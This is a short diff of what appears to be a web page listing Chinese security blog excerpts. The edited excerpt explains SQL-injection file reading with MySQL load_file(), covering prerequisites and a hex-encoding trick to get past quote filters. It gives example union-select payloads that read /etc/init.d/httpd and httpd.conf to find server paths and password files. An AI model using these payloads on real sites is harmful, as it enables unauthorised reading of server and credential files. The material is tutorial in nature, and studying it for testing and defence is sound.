@@ -293,7 +293,7 @@ burpsuite抓包后sqlmap跑了下，python sqlmap.py -r 1.txt，存在注入 通
 
     
     <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        0x00 load_file() 读文件  条件:  1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
+        0x00 load_file() 读文件  条件:  1. 要有file_priv权限: show global variables like '%secure%'; 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
  读/etc/init.d下的东西，这里有配置文件路径
 ?id=1' union select 1,2,load_file('/etc/init.d/httpd')  得到web安装路径
 ?id=1' union select 1,2,load_file('/etc/apache/conf/httpd.conf')  读取密码文件
